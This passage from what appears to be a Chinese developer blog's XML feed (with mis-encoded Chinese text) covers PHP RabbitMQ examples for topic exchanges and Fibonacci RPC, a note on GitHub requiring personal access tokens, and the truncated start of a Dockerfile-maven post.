é˜Ÿåˆ—ç»‘å®šæŒ‡å®šçš„äº¤æ¢æœºè·¯ç”±</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$severities</span> <span class="keyword">as</span> <span class="variable">$severity</span>) &#123;</span><br><span class="line">    <span class="variable">$channel</span>-&gt;queue_bind(<span class="variable">$queue_name</span>, <span class="string">&#x27;direct_logs&#x27;</span>, <span class="variable">$severity</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; [*] Waiting for logs. To exit press CTRL+C&#x27;</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$callback</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27; [x] &#x27;</span>,<span class="variable">$msg</span>-&gt;delivery_info[<span class="string">&#x27;routing_key&#x27;</span>], <span class="string">&#x27;:&#x27;</span>, <span class="variable">$msg</span>-&gt;body, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_consume(<span class="variable">$queue_name</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="variable">$callback</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(count(<span class="variable">$channel</span>-&gt;callbacks)) &#123;</span><br><span class="line">    <span class="variable">$channel</span>-&gt;wait();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;close();</span><br><span class="line"><span class="variable">$connection</span>-&gt;close();</span><br></pre></td></tr></table></figure><h2 id="ä¸»é¢˜"><a href="#ä¸»é¢˜" class="headerlink" title="ä¸»é¢˜"></a>ä¸»é¢˜</h2><p>å‘é€åˆ°ä¸»é¢˜äº¤æ¢æœºï¼ˆtopic exchangeï¼‰çš„æ¶ˆæ¯ä¸å¯ä»¥æºå¸¦éšæ„ä»€ä¹ˆæ ·å­çš„è·¯ç”±é”®ï¼ˆrouting_keyï¼‰ï¼Œå®ƒçš„è·¯ç”±é”®å¿…é¡»æ˜¯ä¸€ä¸ªç”±.åˆ†éš”å¼€çš„è¯è¯­åˆ—è¡¨ã€‚è¿™äº›å•è¯éšä¾¿æ˜¯ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œä½†æ˜¯æœ€å¥½æ˜¯è·Ÿæºå¸¦å®ƒä»¬çš„æ¶ˆæ¯æœ‰å…³ç³»çš„è¯æ±‡ã€‚</p><p>ç»‘å®šé”®ä¹Ÿå¿…é¡»æ‹¥æœ‰åŒæ ·çš„æ ¼å¼ã€‚ä¸»é¢˜äº¤æ¢æœºèƒŒåçš„é€»è¾‘è·Ÿç›´è¿äº¤æ¢æœºå¾ˆç›¸ä¼¼ â€”â€” ä¸€ä¸ªæºå¸¦ç€ç‰¹å®šè·¯ç”±é”®çš„æ¶ˆæ¯ä¼šè¢«ä¸»é¢˜äº¤æ¢æœºæŠ•é€’ç»™ç»‘å®šé”®ä¸ä¹‹æƒ³åŒ¹é…çš„é˜Ÿåˆ—ã€‚ä½†æ˜¯å®ƒçš„ç»‘å®šé”®å’Œè·¯ç”±é”®æœ‰ä¸¤ä¸ªç‰¹æ®Šåº”ç”¨æ–¹å¼ï¼š</p><ul><li>* (æ˜Ÿå·) ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªå•è¯.</li><li># (äº•å·) ç”¨æ¥è¡¨ç¤ºä»»æ„æ•°é‡ï¼ˆé›¶ä¸ªæˆ–å¤šä¸ªï¼‰å•è¯ã€‚</li></ul><h3 id="å‘å¸ƒé˜Ÿåˆ—-1"><a href="#å‘å¸ƒé˜Ÿåˆ—-1" class="headerlink" title="å‘å¸ƒé˜Ÿåˆ—"></a>å‘å¸ƒé˜Ÿåˆ—</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Message</span>\<span class="title">AMQPMessage</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="variable">$channel</span> = <span class="variable">$connection</span>-&gt;channel();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ä¸€ä¸ªä¸»é¢˜ç±»å‹çš„äº¤æ¢æœº</span></span><br><span class="line"><span class="variable">$channel</span>-&gt;exchange_declare(<span class="string">&#x27;topic_logs&#x27;</span>, <span class="string">&#x27;topic&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$routing_key</span> = <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="string">&#x27;anonymous.info&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = implode(<span class="string">&#x27; &#x27;</span>, array_slice(<span class="variable">$argv</span>, <span class="number">2</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>)) <span class="variable">$data</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> AMQPMessage(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_publish(<span class="variable">$msg</span>, <span class="string">&#x27;topic_logs&#x27;</span>, <span class="variable">$routing_key</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; [x] Sent &quot;</span>,<span class="variable">$routing_key</span>,<span class="string">&#x27;:&#x27;</span>,<span class="variable">$data</span>,<span class="string">&quot; \n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;close();</span><br><span class="line"><span class="variable">$connection</span>-&gt;close();</span><br></pre></td></tr></table></figure><h3 id="æ¶ˆè´¹é˜Ÿåˆ—-1"><a href="#æ¶ˆè´¹é˜Ÿåˆ—-1" class="headerlink" title="æ¶ˆè´¹é˜Ÿåˆ—"></a>æ¶ˆè´¹é˜Ÿåˆ—</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="variable">$channel</span> = <span class="variable">$connection</span>-&gt;channel();</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;exchange_declare(<span class="string">&#x27;topic_logs&#x27;</span>, <span class="string">&#x27;topic&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$queue_name</span>, ,) = <span class="variable">$channel</span>-&gt;queue_declare(<span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$binding_keys</span> = array_slice(<span class="variable">$argv</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">empty</span>(<span class="variable">$binding_keys</span> )) &#123;</span><br><span class="line">    file_put_contents(<span class="string">&#x27;php://stderr&#x27;</span>, <span class="string">&quot;Usage: <span class="subst">$argv</span>[0] [binding_key]\n&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$binding_keys</span> <span class="keyword">as</span> <span class="variable">$binding_key</span>) &#123;</span><br><span class="line">    <span class="variable">$channel</span>-&gt;queue_bind(<span class="variable">$queue_name</span>, <span class="string">&#x27;topic_logs&#x27;</span>, <span class="variable">$binding_key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; [*] Waiting for logs. To exit press CTRL+C&#x27;</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$callback</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27; [x] &#x27;</span>,<span class="variable">$msg</span>-&gt;delivery_info[<span class="string">&#x27;routing_key&#x27;</span>], <span class="string">&#x27;:&#x27;</span>, <span class="variable">$msg</span>-&gt;body, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_consume(<span class="variable">$queue_name</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="variable">$callback</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(count(<span class="variable">$channel</span>-&gt;callbacks)) &#123;</span><br><span class="line">    <span class="variable">$channel</span>-&gt;wait();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;close();</span><br><span class="line"><span class="variable">$connection</span>-&gt;close();</span><br></pre></td></tr></table></figure><h2 id="è¿œç¨‹è¿‡ç¨‹è°ƒç”¨"><a href="#è¿œç¨‹è¿‡ç¨‹è°ƒç”¨" class="headerlink" title="è¿œç¨‹è¿‡ç¨‹è°ƒç”¨"></a>è¿œç¨‹è¿‡ç¨‹è°ƒç”¨</h2><h3 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Message</span>\<span class="title">AMQPMessage</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="variable">$channel</span> = <span class="variable">$connection</span>-&gt;channel();</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;queue_declare(<span class="string">&#x27;rpc_queue&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fib</span>(<span class="params"><span class="variable">$n</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$n</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$n</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> fib(<span class="variable">$n</span>-<span class="number">1</span>) + fib(<span class="variable">$n</span>-<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; [x] Awaiting RPC requests\n&quot;</span>;</span><br><span class="line"><span class="variable">$callback</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$req</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$n</span> = intval(<span class="variable">$req</span>-&gt;body);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; [.] fib(&quot;</span>, <span class="variable">$n</span>, <span class="string">&quot;)\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> AMQPMessage(</span><br><span class="line">        (<span class="keyword">string</span>) fib(<span class="variable">$n</span>),</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">&#x27;correlation_id&#x27;</span> =&gt; <span class="variable">$req</span>-&gt;get(<span class="string">&#x27;correlation_id&#x27;</span>))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$req</span>-&gt;delivery_info[<span class="string">&#x27;channel&#x27;</span>]-&gt;basic_publish(</span><br><span class="line">        <span class="variable">$msg</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$req</span>-&gt;get(<span class="string">&#x27;reply_to&#x27;</span>));</span><br><span class="line">    <span class="variable">$req</span>-&gt;delivery_info[<span class="string">&#x27;channel&#x27;</span>]-&gt;basic_ack(</span><br><span class="line">        <span class="variable">$req</span>-&gt;delivery_info[<span class="string">&#x27;delivery_tag&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_qos(<span class="literal">null</span>, <span class="number">1</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_consume(<span class="string">&#x27;rpc_queue&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="variable">$callback</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(count(<span class="variable">$channel</span>-&gt;callbacks)) &#123;</span><br><span class="line">    <span class="variable">$channel</span>-&gt;wait();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;close();</span><br><span class="line"><span class="variable">$connection</span>-&gt;close();</span><br></pre></td></tr></table></figure><h3 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Message</span>\<span class="title">AMQPMessage</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FibonacciRpcClient</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$connection</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$channel</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$callback_queue</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$response</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$corr_id</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> AMQPStreamConnection(</span><br><span class="line">            <span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;channel = <span class="keyword">$this</span>-&gt;connection-&gt;channel();</span><br><span class="line">        <span class="keyword">list</span>(<span class="keyword">$this</span>-&gt;callback_queue, ,) = <span class="keyword">$this</span>-&gt;channel-&gt;queue_declare(</span><br><span class="line">            <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;channel-&gt;basic_consume(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;callback_queue, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">&#x27;on_response&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">on_response</span>(<span class="params"><span class="variable">$rep</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$rep</span>-&gt;get(<span class="string">&#x27;correlation_id&#x27;</span>) == <span class="keyword">$this</span>-&gt;corr_id) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response = <span class="variable">$rep</span>-&gt;body;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"><span class="variable">$n</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;corr_id = uniqid();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$msg</span> = <span class="keyword">new</span> AMQPMessage(</span><br><span class="line">            (<span class="keyword">string</span>) <span class="variable">$n</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;correlation_id&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;corr_id,</span><br><span class="line">                  <span class="string">&#x27;reply_to&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;callback_queue)</span><br><span class="line">            );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;channel-&gt;basic_publish(<span class="variable">$msg</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;rpc_queue&#x27;</span>);</span><br><span class="line">        <span class="keyword">while</span>(!<span class="keyword">$this</span>-&gt;response) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;channel-&gt;wait();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intval(<span class="keyword">$this</span>-&gt;response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fibonacci_rpc</span> = <span class="keyword">new</span> FibonacciRpcClient();</span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$fibonacci_rpc</span>-&gt;call(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; [.] Got &quot;</span>, <span class="variable">$response</span>, <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> RabbitMQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github å¯†ç æš‚æ—¶ç¦ç”¨é—®é¢˜</title>
      <link href="post/1d8035c6/"/>
      <url>post/1d8035c6/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨ 2021 å¹´ 8 æœˆ 13 æ—¥ä¹‹åï¼Œå½“é’ˆå¯¹ Git æ“ä½œè¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼ŒGitHub å°†ä¸å†æ¥å—çº¯è´¦æˆ·åŠ å¯†ç å½¢å¼ï¼Œå³å¼ºåˆ¶è¦æ±‚ä½¿ç”¨åŸºäºä»¤ç‰Œçš„è®¤è¯æœºåˆ¶ã€‚</p><p>GitHub å®˜æ–¹è¡¨ç¤ºï¼Œè¿™ä¸€ä¸¾æªæ˜¯ä¸ºäº†æé«˜ Git æ“ä½œçš„å®‰å…¨æ€§ï¼Œé˜²æ­¢å¯†ç æ’åº“ç­‰äº‹æƒ…å‘ç”Ÿã€‚</p><p>å†ä½¿ç”¨å¯†ç å»å®Œæˆèº«ä»½éªŒè¯ï¼Œå°†æ— æ³•é€šè¿‡ï¼Œä¹Ÿå°±ä¸èƒ½è¿›ä¸€æ­¥æ‰§è¡Œ Git æ“ä½œã€‚</p><span id="more"></span><p>æ®æ‚‰ï¼Œä¸åŸºäºå¯†ç çš„ä¼ ç»Ÿèº«ä»½éªŒè¯æœºåˆ¶ç›¸æ¯”ï¼Œä»¤ç‰Œä¿æŠ¤å…·æœ‰ä»¥ä¸‹å®‰å…¨ä¼˜åŠ¿ï¼š</p><ul><li><p>å”¯ä¸€ ï¼š ä»¤ç‰Œå°†æƒé™äº GitHub ä½¿ç”¨ï¼Œå¯æŒ‰ä½¿ç”¨æ¬¡æ•°æˆ–æŒ‰è®¾å¤‡ç”Ÿæˆã€‚</p></li><li><p>å¯æ’¤é”€ ï¼š ä»¤ç‰Œå¯ä»¥éšæ—¶è¢«å•ç‹¬æ’¤é”€ï¼Œä¸”æ— éœ€æ›´æ–°æœªå—å½±å“çš„å…¶ä»–å‡­è¯ã€‚</p></li><li><p>å—é™ ï¼š ä»¤ç‰Œçš„ä½¿ç”¨èŒƒå›´å¯ä»¥å¾—åˆ°ä¸¥é‡æ§åˆ¶ï¼Œä¾‹å¦‚ä»…å…è®¸æ‰§è¡Œç”¨ä¾‹ä¸­éœ€è¦çš„è®¿é—®æ´»åŠ¨ã€‚</p></li><li><p>éšæœº ï¼š ä»¤ç‰Œçš„å¤æ‚åº¦è¿œé«˜äºæ‚¨éœ€è¦ç¡¬æ€§è®°å¿†å¹¶å®šæœŸè¾“å…¥çš„ç®€å•å¯†ç ï¼Œå› æ­¤ä¸å—å­—å…¸æˆ–æš´åŠ›ç ´è§£ç­‰è¡Œä¸ºçš„å½±å“ã€‚</p></li></ul><h3 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h3><p>å‘½ä»¤è¡Œè¿”å›é”™è¯¯å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remote: Password authentication is temporarily disabled as part of a brownout. Please use a personal access token instead.</span><br><span class="line">remote: Please see https://github.blog/2020-07-30-token-authentication-requirements-for-api-and-git-operations/ for more information.</span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•</p><ul><li><p>åˆ›å»ºä¸ªäººè®¿é—®ä»¤ç‰Œæ•™ç¨‹: <a href="https://docs.github.com/cn/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token">https://docs.github.com/cn/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token</a></p></li><li><p>å¯†ç æ›¿æ¢ä¸ºä»¤ç‰Œæ•™ç¨‹: <a href="https://docs.github.com/cn/get-started/getting-started-with-git/updating-credentials-from-the-macos-keychain">https://docs.github.com/cn/get-started/getting-started-with-git/updating-credentials-from-the-macos-keychain</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfile-maven æ„å»ºé•œåƒ</title>
      <link href="post/9563/"/>
      <url>post/9563/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><code>Maven</code> æœ‰å‡ ä¸ª <code>Docker</code> æ’ä»¶å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ç”± <code>Spotify</code> å…¬å¸å¼€å‘çš„ <code>Maven</code> æ’ä»¶ï¼Œç”±äº<code>docker-maven-plugin</code> è¿™ä¸ªæ’ä»¶å·²ç»ä¸æ¨èä½¿ç”¨äº†ï¼Œ<code>docker-maven-plugin</code> æ’ä»¶å¯ä»¥ä¸ä½¿ç”¨ <code>Dockerfile</code> è€Œç›´æ¥åœ¨ <code>pom.xml</code> ä¸­æ¥æ„å»ºé•œåƒï¼Œè¿™ç§æ–¹å¼å¯èƒ½å¯¼è‡´å¾ˆå¤šä¸å¿…è¦çš„æ··æ·†ï¼Œæ‰€ä»¥æ¨èæ›´å¥½çš„ <code>dockerfile-maven</code> æ’ä»¶ä½œä¸ºæ›¿ä»£</p><span id="more"></span><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>å…·ä½“å¯å‚è€ƒå®˜æ–¹ç”¨ä¾‹ï¼š<a href="https://github.com/spotify/dockerfile-maven/tree/master/plugin/src/it/advanced">https://github.com/spotify/dockerfile-maven/tree/master/plugin/src/it/advanced</a></p><h4 id="æ·»åŠ æ’ä»¶"><a href="#æ·»åŠ æ’ä»¶" class="headerlink" title="æ·»åŠ æ’ä»¶"></a>æ·»åŠ æ’ä»¶</h4><p>åœ¨é¡¹ç›®çš„ 